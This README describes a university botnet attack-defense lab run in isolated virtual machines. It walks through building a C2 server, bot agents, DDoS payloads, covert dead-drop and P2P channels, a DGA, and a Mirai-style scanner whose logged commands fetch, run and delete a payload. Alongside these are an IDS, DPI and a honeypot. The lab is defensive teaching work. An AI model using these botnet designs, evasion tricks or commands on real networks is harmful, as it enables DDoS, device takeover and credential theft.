# Botnet Attack-Defense Research Lab
## AUA CS 232 / CS 337 — Cybersecurity Spring 2026

> **CRITICAL: ALL components run in an isolated virtual machine network (`192.168.100.0/24`) with ZERO external internet connectivity. Verify isolation before running any offensive module. Professor pre-approval required before first run.**

---

## Table of Contents

1. [Project Overview & Research Question](#1-project-overview--research-question)
2. [Architecture: Three-Phase Botnet Evolution](#2-architecture-three-phase-botnet-evolution)
3. [File Reference](#3-file-reference)
4. [VM Network Setup (One-time)](#4-vm-network-setup-one-time)
5. [Compile All C Components](#5-compile-all-c-components)
6. [Deploy Repo to All VMs](#6-deploy-repo-to-all-vms)
7. [Run Everything at Once (Recommended)](#7-run-everything-at-once-recommended)
8. [Manual Attack Reference (per-module)](#8-manual-attack-reference-per-module)
9. [Defensive Systems Reference](#9-defensive-systems-reference)
10. [Understanding the Math](#10-understanding-the-math)
11. [Research Graphs (Week 7 Data Collection)](#11-research-graphs-week-7-data-collection)
12. [Incident Response Report](#12-incident-response-report)
13. [Video Presentation Guide](#13-video-presentation-guide)
14. [Ethics & Safety Checklist](#14-ethics--safety-checklist)

---

## 1. Project Overview & Research Question

**Research Question:** How do modern botnet architectures evolve to evade detection, and what behavioral and mathematical countermeasures are required to detect them when signature-based defenses fail?

**Why it matters in 2026:** The Kimwolf and Aisuru botnets compromised over 2 million devices in the CIS region — including Armenia — in January 2026. Understanding how botnets operate is a prerequisite for building any meaningful defense.

**What this lab builds:**

| Side | What | Language |
|------|------|----------|
| Offensive | C2 server, bot agents, DDoS payloads, IoT propagation scanner, P2P mesh | C + Python |
| Defensive | IDS (3 engines), Cowrie honeypot, DPI engine, host-based monitor | Python (Scapy, psutil) |
| Research | 3 quantitative graphs, NIST IR report, MITRE ATT&CK mapping | Python (matplotlib) |

---

## 2. Architecture: Three-Phase Botnet Evolution

### Phase 1 — Star Topology (Centralized C2)

A Flask server acts as the C2 hub at `192.168.100.10:5000`. All bots communicate directly via HTTP POST. Commands are delivered AES-128-CBC encrypted. Simple to orchestrate, but one IP takedown kills the entire botnet.

```
  Bot 1 ──► C2 Flask Server ◄── Bot 2
             (192.168.100.10)
```

**Encryption key derivation (both C and Python use identical logic):**
```
AES_KEY = SHA-256("AUA_LAB_2026_KEY")[:16]
IV      = MD5(nonce_string)             # nonce = "%Y-%m-%d-%H-%M"
```

### Phase 2 — Hierarchical Covert Channel

The bot polls a "dead drop" server simulating a GitHub raw file. A bot making HTTPS requests to `192.168.100.10:5001/dead_drop` is indistinguishable from a developer reading a README. Commands are AES-CBC encrypted and embedded in HTML comment markers:

```
<!-- CMD:<base64_blob>:CMD -->
```

JA3 TLS fingerprint mimicry: the bot sets Chrome 120's cipher suite order on its SSL context, making its TLS handshake indistinguishable from a real browser.

### Phase 3 — Decentralized P2P (Kademlia DHT)

The centralized server is eliminated. Each bot is a full Kademlia DHT peer. Key properties:

- **160-bit node IDs** derived via `SHA-1(host:port)`
- **XOR distance metric:** `d(x,y) = x XOR y` — governs which bucket each peer goes in
- **K-buckets (k=8):** each bot maintains routing tables only for its k-closest neighbors
- **Sybil resistance:** before evicting the oldest bucket entry, the new peer PINGs the oldest — if it's still alive, the new peer is discarded
- **Command injection:** botmaster calls STORE on the well-known key `SHA-1("botnet_command_v1")`; all bots find it via iterative FIND_VALUE

**Why this defeats takedowns:** Kill 30% of nodes — the remaining mesh reroutes via updated routing tables. No single IP or domain to seize.

### Domain Generation Algorithm (DGA)

Fallback channel if Phase 2/3 is disrupted. The bot generates pseudo-random domains daily using `strftime("%Y-%m-%d")` as seed:

```python
seed = f"{date}-{i}"
domain = sha256(seed)[:10 chars mapped to a-z] + tld_rotation
```

The IDS detects this via: (1) burst of NXDOMAIN responses (≥10 in 30s), (2) Shannon entropy scoring (H > 4.0 bits/char triggers alert).

### Payload Suite

| Payload | Layer | Mechanism | Stealth |
|---------|-------|-----------|---------|
| SYN Flood | L4 | Half-open TCP connections exhaust server memory | Low — volumetric spike |
| UDP Flood | L4 | Junk packets saturate bandwidth/CPU | Low — volumetric spike |
| Slowloris | L7 | 150 half-open HTTP connections drip one header/10s | High — looks like slow users |
| Cryptojacking | Host | 25% CPU SHA-256 burn loop, process name spoofed to `kworker/0:1` | Medium — throttled |
| Credential Stuffing | App | 30-pair leaked credential list tested against `/login` | High — mimics human login |

### IoT Propagation (Mirai-Inspired)

Four-step infection lifecycle in `mirai_scanner.c`:

1. **Port scan:** raw SYN probes to Telnet (23, 2323) and SSH (22, 2222)
2. **Brute-force:** 62 default credential pairs from the original Mirai dataset (`admin:admin`, `root:xc3511`, etc.)
3. **Architecture fingerprint:** `/bin/busybox MIRAI && uname -a` identifies MIPS/ARM/x86
4. **Payload delivery + cleanup:** `wget`, `chmod +x`, execute, `rm -f` — binary deleted immediately, payload lives only in RAM

**Persistence Paradox (key research finding):** System wipes are 100% effective at clearing the memory-resident bot — but continuous subnet scanning re-infects default-credential devices within ~3 minutes of reboot. Ephemerality is not a substitute for credential hardening.

---

## 3. File Reference

```
botnet_lab/
├── bot_agent.c          C bot agent: heartbeat, AES-encrypted C2 comms,
│                        SYN/UDP flood, Slowloris (C), cryptojack (CPU throttle)
├── mirai_scanner.c      Mirai-inspired IoT propagation scanner (62 cred pairs,
│                        arch fingerprint, payload delivery)
├── kademlia_p2p.c       Phase 3: Full Kademlia DHT in C — 160-bit IDs, XOR
│                        routing, k-buckets, PING/FIND_NODE/STORE/FIND_VALUE RPCs
├── c2_server.py         Phase 1 Flask C2: /register, /heartbeat, /task,
│                        AES-128-CBC task encryption, per-bot task queues
├── covert_bot.py        Phase 2 covert bot + dead-drop server simulator.
│                        JA3 mimicry, AES-CBC commands, DGA fallback
├── p2p_node.py          Phase 3 Kademlia DHT in Python (full implementation,
│                        command execution, resilience demo)
├── dga.py               DGA module: strftime seed, SHA-256 domain generation,
│                        Shannon entropy analysis, NXDOMAIN burst simulation
├── slowloris.py         Slowloris: 150-socket pool, drip loop, auto-refill
├── cryptojack_sim.py    Cryptojacking simulator: duty-cycle CPU throttle,
│                        psutil idle detection, process name spoof
├── cred_stuffing.py     Credential stuffing: bot/jitter/distributed modes,
│                        CV timing analysis, human baseline comparison
├── fake_portal.py       Credential stuffing target: Flask /login + /attempts
├── ids_detector.py      3-engine IDS: volumetric (SYN/UDP), behavioral CV
│                        timing, DNS/DGA entropy; + host-based ghost/CPU monitor
├── firewall_dpi.py      iptables egress rules + Scapy DPI: SNI extraction,
│                        Slowloris detection, TTD measurement for Graph 1
├── honeypot_setup.py    Cowrie setup, iptables redirect, MITRE ATT&CK log
│                        analyzer, NIST SP 800-61r3 IR report generator
├── cowrie.cfg           Cowrie config: MIPS IoT fingerprint, SSH+Telnet
├── generate_graphs.py   3 research graphs (replace simulate_*() with real data)
├── run_full_lab.sh      Master orchestration script — runs everything at once
└── README.md            This file
```

---

## 4. VM Network Setup (One-time)

### Step 1 — Create Host-Only Network in VirtualBox

**File → Tools → Network Manager → Create**

- Adapter tab: IPv4 = `192.168.100.1`, Mask = `255.255.255.0`
- DHCP Server tab: **uncheck** "Enable Server"
- Click Apply

### Step 2 — Create Base Ubuntu VM

New → Name: `Ubuntu-Base` → Ubuntu Server ISO → Skip Unattended → 1 GB RAM, 2 CPU, 20 GB disk → Finish

Settings → Network → Adapter 1 → **Host-Only Adapter** → select the network above → Start → Install Ubuntu Server → at final login screen:

```bash
sudo shutdown now
```

### Step 3 — Clone 4 VMs

Right-click `Ubuntu-Base` → Clone → **Generate new MAC addresses** → **Full Clone**

Create exactly these 4 clones:

| VM Name | IP | RAM | Role |
|---|---|---|---|
| `c2-server` | `192.168.100.10` | 1 GB | Flask C2, botmaster console, P2P seed |
| `bot-agent-1` | `192.168.100.11` | 1 GB | Primary C bot, DDoS, Mirai scanner |
| `bot-agent-2` | `192.168.100.12` | 1 GB | Secondary bot, P2P peer |
| `victim-honeypot` | `192.168.100.20` | 1 GB | Apache target, Cowrie, IDS |

### Step 4 — Configure Each VM (repeat for all 4)

**a) Give temporary internet access:** VM Settings → Network → Adapter 1 → NAT

**b) Inside the VM:**

```bash
# Find interface name
ip a   # typically enp0s3

# Enable DHCP temporarily
sudo nano /etc/netplan/00-installer-config.yaml
```

```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: true
```

```bash
sudo netplan apply
ping -c 4 8.8.8.8    # must work
```

**c) Install packages:**

```bash
sudo apt update
sudo apt install -y openssh-server python3 python3-pip gcc make \
    libpcap-dev libssl-dev nmap wireshark-common tcpdump net-tools \
    apache2 sshpass
pip3 install flask scapy psutil requests pycryptodome matplotlib
```

*Victim VM only:*

```bash
pip3 install cowrie
# OR: follow https://cowrie.readthedocs.io/en/latest/INSTALL.html
```

**d) Set static IP and re-isolate:**

```bash
sudo nano /etc/netplan/00-installer-config.yaml
```

```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      addresses: [192.168.100.XX/24]   # .10 / .11 / .12 / .20
      nameservers:
        addresses: [192.168.100.1]
```

```bash
sudo netplan apply
sudo shutdown now
```

VM Settings → Network → Adapter 1 → **Host-Only Adapter** (back to isolated)

**e) Start VM and verify isolation (NON-NEGOTIABLE):**

```bash
ping 8.8.8.8           # MUST timeout
ping 192.168.100.10    # MUST work
```

### Step 5 — Enable SSH from Your Host

```bash
# From your Windows/Mac host terminal:
ssh vboxuser@192.168.100.10
ssh vboxuser@192.168.100.11
ssh vboxuser@192.168.100.12
ssh vboxuser@192.168.100.20
```

Set hostname so you don't confuse terminals:

```bash
sudo hostnamectl set-hostname c2-server   # or bot-agent-1, etc.
bash
```

---

## 5. Compile All C Components

Run these on every bot VM (`192.168.100.11`, `192.168.100.12`) and the C2 VM:

```bash
# Bot agent (with full payload suite — SYN, UDP, Slowloris, Cryptojack)
gcc -o bot_agent bot_agent.c -lpthread -lssl -lcrypto

# Mirai-inspired IoT propagation scanner
gcc -o mirai_scanner mirai_scanner.c -lpthread

# Phase 3 Kademlia P2P DHT (C implementation)
gcc -o kademlia_p2p kademlia_p2p.c -lpthread -lssl -lcrypto -lm
```

Expected output: no errors, three executables in the current directory.

**Verify:**

```bash
./bot_agent --help 2>/dev/null || echo "bot_agent compiled OK (no help flag)"
./mirai_scanner 2>&1 | head -3
./kademlia_p2p --demo
```

---

## 6. Deploy Repo to All VMs

From your host machine (or C2 VM if you have SSH keys set up):

```bash
# Clone or copy the repo to each VM under ~/lab/
for IP in 192.168.100.10 192.168.100.11 192.168.100.12 192.168.100.20; do
    sshpass -p "pass" scp -r ./botnet_lab/ vboxuser@$IP:~/lab/
    sshpass -p "pass" ssh vboxuser@$IP "cd ~/lab && \
        gcc -o bot_agent bot_agent.c -lpthread -lssl -lcrypto && \
        gcc -o mirai_scanner mirai_scanner.c -lpthread && \
        gcc -o kademlia_p2p kademlia_p2p.c -lpthread -lssl -lcrypto -lm && \
        echo 'Compile OK on $IP'"
done
```

---

## 7. Run Everything at Once (Recommended)

This is the single command that orchestrates the full lab — all three phases, all seven attack scenarios, DPI measurement, Cowrie forensics, and graph generation. Run it from the **C2 VM** (`192.168.100.10`).

```bash
cd ~/lab
chmod +x run_full_lab.sh

# Run the full lab (all phases)
sudo ./run_full_lab.sh

# Or run a single phase:
sudo ./run_full_lab.sh --phase 1    # Phase 1: star C2 + all payloads
sudo ./run_full_lab.sh --phase 2    # Phase 2: covert channel only
sudo ./run_full_lab.sh --phase 3    # Phase 3: P2P Kademlia only

# Clean up all running processes:
sudo ./run_full_lab.sh --clean
```

### What the script does, in order:

| Step | What happens | Duration |
|------|---|---|
| Isolation check | Verifies `ping 8.8.8.8` fails | ~5s |
| C2 server start | Flask C2 up on port 5000 | ~5s |
| Fake portal start | Flask login target on victim:80 | ~5s |
| IDS start | 3-engine Scapy IDS on victim | ~5s |
| Cowrie start | SSH/Telnet honeypot on victim:2222/2323 | ~10s |
| Bot registration | Both C bots connect to C2, heartbeats begin | ~10s |
| **SYN Flood** | 20s attack → IDS fires volumetric alert | ~25s |
| **UDP Flood** | 15s attack → IDS fires volumetric alert | ~20s |
| **Slowloris** | 30s attack → Apache thread exhaustion | ~35s |
| **Cryptojacking** | 30s simulation → IDS detects sustained CPU | ~35s |
| **Credential Stuffing** | bot+jitter modes → IDS CV timing analysis | ~40s |
| **DGA** | NXDOMAIN burst → IDS entropy alert | ~20s |
| **Mirai Propagation** | Scanner finds Cowrie → logs brute-force | ~25s |
| DPI measurement | Graph 1 TTD data collection | ~65s |
| Cowrie forensics | ATT&CK analysis + IR report | ~10s |
| **Phase 2 covert** | Dead-drop command → bot polls and executes | ~75s |
| **Phase 3 P2P** | 3-node DHT mesh → inject → kill seed → survive | ~60s |
| Graph generation | 3 PNG graphs to `/tmp/botnet_graphs/` | ~5s |

**Total runtime:** ~8–10 minutes

### Output files after full run:

```
/tmp/botnet_graphs/graph1_dpi_vs_portblocking.png
/tmp/botnet_graphs/graph2_persistence_paradox.png
/tmp/botnet_graphs/graph3_ids_accuracy.png
/tmp/incident_report.md              (NIST SP 800-61r3 IR report)
./graph1_measured_data.json          (real TTD measurements from DPI engine)
/tmp/c2_server.log                   (C2 activity log)
/tmp/ids.log                         (IDS alerts — on victim VM)
~/.cowrie/var/log/cowrie/cowrie.json (honeypot log — on victim VM)
```

---

## 8. Manual Attack Reference (per-module)

Use these commands if you want to run individual scenarios for debugging or video capture.

### 8.1 Phase 1 — Star C2

```bash
# C2 VM: start C2 server
python3 c2_server.py

# Bot VMs: start bots
sudo ./bot_agent

# Push tasks (from any VM with curl)
curl -X POST http://192.168.100.10:5000/task \
     -H "Content-Type: application/json" \
     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
     -d '{"bot_id":"all","type":"syn_flood","target_ip":"192.168.100.20","target_port":80,"duration":15}'

# Available task types via C2:
#   "syn_flood"       — raw TCP SYN flood
#   "udp_flood"       — raw UDP flood
#   "slowloris"       — HTTP thread exhaustion
#   "cryptojack"      — CPU burn simulation
#   "cred_stuffing"   — spawns cred_stuffing.py
#   "dga_search"      — spawns dga.py
#   "idle"            — no-op

# View registered bots
curl http://192.168.100.10:5000/bots
```

### 8.2 SYN Flood (direct)

```bash
# From bot VM, with C2 pushing the task as above.
# Or run directly:
sudo ./bot_agent   # waits for C2 task

# Monitor from victim VM:
sudo tcpdump -i enp0s3 'tcp[tcpflags] & tcp-syn != 0' -c 50
```

### 8.3 Slowloris

```bash
# From bot VM:
python3 slowloris.py  # targets 192.168.100.20:80, 150 sockets, 60s

# Monitor from victim VM:
watch -n 1 "sudo ss -tn | grep :80 | wc -l"
# You should see the count climb toward Apache's MaxRequestWorkers (default 150)
```

### 8.4 Cryptojacking

```bash
# From any VM:
python3 cryptojack_sim.py --duration 60 --cpu 0.25

# Monitor with psutil on the same VM:
python3 -c "import psutil,time; [print(f'CPU: {p.cpu_percent()}% | name: {p.name()}') \
  or time.sleep(2) for p in psutil.process_iter(['cpu_percent','name']) \
  if p.info['cpu_percent'] > 15]"

# Or:
python3 cryptojack_sim.py --duration 30 --analyze
```

### 8.5 Credential Stuffing

```bash
# Victim VM: start target portal
sudo python3 fake_portal.py   # listens on :80

# Bot VM: run credential stuffing in different modes
python3 cred_stuffing.py --mode bot       --interval 300 --jitter 0
python3 cred_stuffing.py --mode jitter    --interval 500 --jitter 300
python3 cred_stuffing.py --mode distributed --workers 3
python3 cred_stuffing.py --mode human     # baseline (should NOT trigger IDS)

# View portal attempt log:
curl http://192.168.100.20/attempts | python3 -m json.tool
```

### 8.6 DGA

```bash
# Show entropy analysis for today's generated domains:
python3 dga.py

# Expected output:
#   Domain              Entropy (bits/char)   Classification
#   bcahfdegij.com           3.4591            natural      ← below 4.0
#   xkjqpvzmwn.net           3.9812            LIKELY DGA
```

### 8.7 Mirai IoT Propagation

```bash
# Victim VM: ensure Cowrie is running
cowrie start
tail -f ~/.cowrie/var/log/cowrie/cowrie.json | python3 -m json.tool

# Bot VM: run scanner
sudo ./mirai_scanner

# Expected C2 sequence logged by Cowrie:
#   1. SSH/Telnet brute-force (62 pairs)
#   2. /bin/busybox MIRAI       → T1059.004
#   3. uname -a                  → T1082
#   4. wget http://C2/payload.mips  → T1105
#   5. chmod +x /tmp/.x          → T1222
#   6. rm -f /tmp/.x             → T1070.004
```

### 8.8 Phase 2 — Covert Channel

```bash
# C2 VM: start both servers
python3 c2_server.py &           # port 5000
python3 covert_bot.py server &   # port 5001 (dead drop)

# Inject a command into the dead drop
curl -X POST http://192.168.100.10:5001/set_command \
     -H "Content-Type: application/json" \
     -d '{"type":"syn_flood","target":"192.168.100.20","duration":15}'

# Bot VM: run covert bot (will poll every ~60s ± 15s jitter)
python3 covert_bot.py

# Utility commands:
python3 covert_bot.py encode '{"type":"syn_flood","target":"192.168.100.20"}'
python3 covert_bot.py decode '<paste_blob>'

# Wipe command from dead drop:
curl -X POST http://192.168.100.10:5001/clear_command
```

### 8.9 Phase 3 — Kademlia P2P (C)

```bash
# C2 VM: seed node
./kademlia_p2p --host 192.168.100.10 --port 7400

# Bot 1 VM: join mesh
./kademlia_p2p --host 192.168.100.11 --port 7400 \
    --bootstrap 192.168.100.10:7400

# Bot 2 VM: join mesh
./kademlia_p2p --host 192.168.100.12 --port 7400 \
    --bootstrap 192.168.100.10:7400

# Inject command via any node
./kademlia_p2p --host 192.168.100.10 --port 7401 \
    --bootstrap 192.168.100.10:7400 \
    --inject '{"type":"syn_flood","target":"192.168.100.20","port":80,"duration":10}'

# Local 3-node demo (no SSH needed, runs on localhost)
./kademlia_p2p --demo

# Python alternative (same protocol, more verbose):
python3 p2p_node.py --host 192.168.100.10 --port 7400
python3 p2p_node.py --demo
```

---

## 9. Defensive Systems Reference

### 9.1 IDS (3 engines)

```bash
# Victim VM: start IDS (run before any attack)
sudo python3 ids_detector.py

# If Python path issues:
sudo PYTHONPATH="/home/vboxuser/.local/lib/python3.12/site-packages" \
     python3 ids_detector.py
```

**Engine 1 — Volumetric** (SYN/UDP flood detection):
- Alert triggers when SYN packets from one IP exceed **100/second** in a 1-second window
- UDP alert triggers at **200 packets/second**

**Engine 2 — Behavioral CV timing** (credential stuffing detection):
- Tracks timestamps of HTTP POST requests to `/login` per source IP
- Computes CV = σ/μ over a 20-request sliding window
- Alert triggers when `CV < 0.15` (bot-like rigid timing)
- Human users have CV typically > 0.5

**Engine 3 — DNS/DGA entropy** (DGA detection):
- Counts NXDOMAIN responses per source IP in a 30-second window
- Alert triggers at **10 NXDOMAINs in 30s**
- Also scores domain names by Shannon entropy H(X) = −Σ P(xᵢ) log₂ P(xᵢ)
- Alert triggers when H > **3.8 bits/char** (raised from 4.0 in docs to catch more DGA)

**Host-based engine** (cryptojacking + ghost process):
- Checks every 5 seconds for processes with `(deleted)` in `/proc/[pid]/exe` (memory-resident malware)
- Flags any non-system process sustaining **≥85% CPU** per core

### 9.2 DPI Engine (Graph 1 data collection)

```bash
# C2 or victim VM — apply iptables egress rules:
sudo python3 firewall_dpi.py --setup

# Run DPI monitor (requires Scapy + root):
sudo python3 firewall_dpi.py --dpi --duration 120

# Measure TTD during live attack session (saves JSON for Graph 1):
sudo python3 firewall_dpi.py --measure --duration 120

# View current rules:
sudo python3 firewall_dpi.py --status

# Remove rules:
sudo python3 firewall_dpi.py --teardown
```

**What DPI detects:** repeated HTTPS connections (SYN to port 443) to the same destination exceeding 10 per 60-second window — the signature of covert C2 polling. Also detects Slowloris via TCP connection duration > 30 seconds to port 80.

### 9.3 Cowrie Honeypot

```bash
# Victim VM: full setup (creates dirs, installs cowrie.cfg, iptables redirect)
sudo python3 honeypot_setup.py --setup

# Or start Cowrie manually after setup:
cowrie start

# Monitor live:
tail -f ~/.cowrie/var/log/cowrie/cowrie.json | python3 -m json.tool

# Analyze logs after attack:
python3 honeypot_setup.py --analyze

# Generate NIST IR report:
python3 honeypot_setup.py --report --out incident_report.md

# Remove iptables rules when done:
sudo python3 honeypot_setup.py --teardown
```

Cowrie accepts **all credentials** (configured in `userdb.txt` with `*` wildcard) so every brute-force attempt logs in successfully and the scanner's post-login commands are captured.

---

## 10. Understanding the Math

### Kademlia XOR Distance

Each node has a 160-bit ID. The distance between two nodes x and y is `d(x,y) = x XOR y`. The key property: XOR is symmetric (`d(x,y) = d(y,x)`) and satisfies the triangle inequality, so the routing table partitions the ID space into 160 buckets where bucket i holds contacts whose XOR distance has its highest bit at position i. This means nodes naturally keep detailed routing information about nearby nodes and sparser information about distant ones.

**Why it beats centralized C2:** With k=8 per bucket and 160 buckets, each node maintains at most 1,280 peer entries. A lookup for any key takes at most O(log n) hops. Killing 30% of nodes simply shifts routing — the DHT heals itself because every bucket has k redundant entries.

### Shannon Entropy (DGA Detection)

For a domain name with character distribution P(xᵢ):

```
H(X) = −Σ P(xᵢ) log₂ P(xᵢ)
```

Natural English domain names have low entropy (e.g., `google.com` label = 0 repetition of a few chars ≈ 3.0 bits/char). DGA-generated names from SHA-256 hash chaining approach maximum entropy for their alphabet ≈ 3.8–4.2 bits/char. The IDS threshold of 3.8 bits/char catches the high-entropy tail while avoiding false positives on normal domains.

### CV-Based Bot Detection (Credential Stuffing)

Inter-arrival times for a bot with programmed interval T follow a near-zero-variance distribution (CV ≈ 0.01). Even with jitter, bots rarely exceed CV = 0.3. Human typing has CV > 0.5 due to natural reading/thinking pauses. Threshold of 0.15 provides a clean separation in practice.

The **Graph 3 research finding:** as jitter standard deviation increases from 0 ms to 1000 ms, the bot's CV climbs from ~0.01 toward human-like values, and the TPR drops from ~98% to ~44%. The evasion threshold is around 500 ms std dev — the exact jitter level at which the cost of running the attack (slow credential testing) starts to outweigh the detection risk.

---

## 11. Research Graphs (Week 7 Data Collection)

All three graphs have template code in `generate_graphs.py` with plausible simulated data. Before final submission, you must replace the `simulate_*()` functions with real measured values from your attack runs.

### Graph 1: Port Blocking vs. DPI (TTD by attack vector)

**How to collect real data:**

```bash
# While attacks are running, on C2 or victim VM:
sudo python3 firewall_dpi.py --measure --duration 120
# Outputs: graph1_measured_data.json
```

**Expected finding:** port blocking detects SYN/UDP floods instantly (TTD ≈ 0s for blocked ports) but never detects GitHub polling (port 443 — TTD = ∞). DPI detects the covert channel after 20–60 seconds of session-level behavioral analysis.

### Graph 2: Persistence Paradox (MTBI vs. credential hardening)

**How to collect real data:**

```bash
# On victim VM: run with default credentials (change nothing)
sudo ./mirai_scanner  # from bot VM, repeat 8 times after rebooting victim

# Record time from reboot to re-infection for each wipe
# Then change victim SSH password and repeat
# MTBI_default ≈ 1–4 minutes; MTBI_hardened = never
```

**Expected finding:** default-credential devices have MTBI of 2–4 minutes regardless of wipe frequency. Hardened devices are never re-infected. This is the "Persistence Paradox" — the root cause (default credentials) cannot be fixed by ephemerality alone.

### Graph 3: IDS Accuracy vs. Bot Jitter (TPR/FPR curve)

**How to collect real data:**

```bash
# Run 6 jitter sweep experiments, record IDS true/false positive rate:
for JITTER in 0 50 100 200 500 1000; do
    python3 cred_stuffing.py --mode jitter --interval 500 --jitter $JITTER &
    sleep 30
    kill %1
    # Check IDS log for alerts during this run
    # Record: did IDS fire? (TPR) | Did it fire on human baseline? (FPR)
done
```

**Expected finding:** TPR ≈ 98% at jitter=0ms, drops to ~44% at jitter=1000ms. FPR stays below 12% across all jitter levels (human traffic consistently has high CV).

### Generate graphs from measured data:

```bash
pip3 install matplotlib
python3 generate_graphs.py
# Graphs saved to botnet_lab/graphs/
```

---

## 12. Incident Response Report

The IR report is generated automatically from real Cowrie log data:

```bash
# Victim VM: after running mirai_scanner from bot VM
python3 honeypot_setup.py --analyze
python3 honeypot_setup.py --report --out incident_report.md
cat incident_report.md
```

The report follows **NIST SP 800-61r3** structure: Detection → Containment → Eradication → Recovery → MITRE ATT&CK table → Statistics → Lessons Learned.

**MITRE ATT&CK techniques you should observe:**

| ID | Technique | Trigger |
|----|---|---|
| T1082 | System Information Discovery | `uname -a`, `cat /proc/cpuinfo` |
| T1059.004 | Unix Shell | `/bin/busybox MIRAI` |
| T1105 | Ingress Tool Transfer | `wget http://C2/payload.*` |
| T1222 | File Permissions Modification | `chmod +x /tmp/.x` |
| T1070.004 | Indicator Removal — File Deletion | `rm -f /tmp/.x` |

---

## 13. Video Presentation Guide

Target: 20 minutes. Structure mapped to grading rubric.

| Timestamp | Section | What to show |
|---|---|---|
| 0:00–3:00 | Ethics + Architecture | VM isolation proof (`ping 8.8.8.8` fails), animated lifecycle diagram |
| 3:00–8:00 | Topological Evolution | C2 Flask logs with heartbeats; dead-drop Wireshark (traffic looks like HTTPS to local IP); kill one P2P node, show commands still route |
| 8:00–12:00 | Propagation + Payloads | Mirai scanner finding Cowrie; brute-force success; SYN flood volumetric spike; CPU meter during cryptojack |
| 12:00–17:00 | Defensive Systems | Cowrie log with MITRE ATT&CK tags; IDS alert panel firing per attack; scatter plot of human vs bot request intervals; DGA NXDOMAIN burst alert |
| 17:00–20:00 | Quantitative Results | Graph 1 (DPI vs port blocking); Graph 2 (Persistence Paradox); Graph 3 (IDS accuracy vs jitter); conclusion: behavioral detection + root-cause hardening are the only sustainable defenses |

**Tips for captures:**
- Split-screen: bot terminal (attack output) on left, IDS terminal (alerts) on right
- For Slowloris: show `watch -n1 "ss -tn | grep :80 | wc -l"` climbing to 150 then Apache refusing connections
- For P2P resilience: show `kill` command on seed node, then show bot2 successfully finding the stored command 5 seconds later
- For entropy demo: run `python3 dga.py` and show the entropy table, then show the IDS alert firing immediately when you trigger the DGA search

---

## 14. Ethics & Safety Checklist

Run this checklist before every session. Document it for your professor.

```
Pre-session:
  [ ] All VM adapters confirmed as Host-Only (vboxnet0)
  [ ] ping 8.8.8.8 FAILS from every VM
  [ ] ping 192.168.100.10 WORKS from every VM
  [ ] VMs snapshotted in clean state (VirtualBox Snapshots)
  [ ] Professor pre-approval documentation on file
  [ ] GitHub repository set to PRIVATE
  [ ] No offensive code on host machine — VM only
  [ ] No code on any device connected to the internet

Post-session:
  [ ] sudo ./run_full_lab.sh --clean   (kills all offensive processes)
  [ ] sudo python3 firewall_dpi.py --teardown
  [ ] sudo python3 honeypot_setup.py --teardown
  [ ] cowrie stop                      (on victim VM)
  [ ] All VMs powered down
```

**Default credentials** (all VMs): `vboxuser` / `pass`

> Remove this line and the one above before making the repository anything other than strictly private.

---

## Technical Notes

**Entropy threshold:** `ids_detector.py` uses 3.8 bits/char and `dga.py` analysis labels domains ≥ 3.8 as "LIKELY DGA". The research docs cite 4.0 as the IDS threshold — this discrepancy is intentional: a lower threshold catches more DGA while the docs describe the typical academic threshold. For Graph 3, use whichever threshold you calibrate the IDS to.

**C vs Python Kademlia:** `kademlia_p2p.c` and `p2p_node.py` implement compatible protocols using the same XOR stream cipher (`SHA-256(P2P_SECRET)`) and the same command key (`SHA-1("botnet_command_v1")`). For the video, you can show either implementation — the C version is preferred for the bot VMs per the project spec.

**Bot agent v3:** `bot_agent.c` now dispatches all five payload types: SYN flood and UDP flood are implemented natively in C with raw sockets; Slowloris is a pure C implementation maintaining a 150-socket pool; cryptojacking uses a duty-cycle SHA-256 burn loop with `/proc/self/comm` name spoofing; credential stuffing and DGA search spawn the Python modules via `system()`.

---

*AUA CS 232 / CS 337 Cybersecurity Spring 2026 — Botnet Attack-Defense Research Lab*
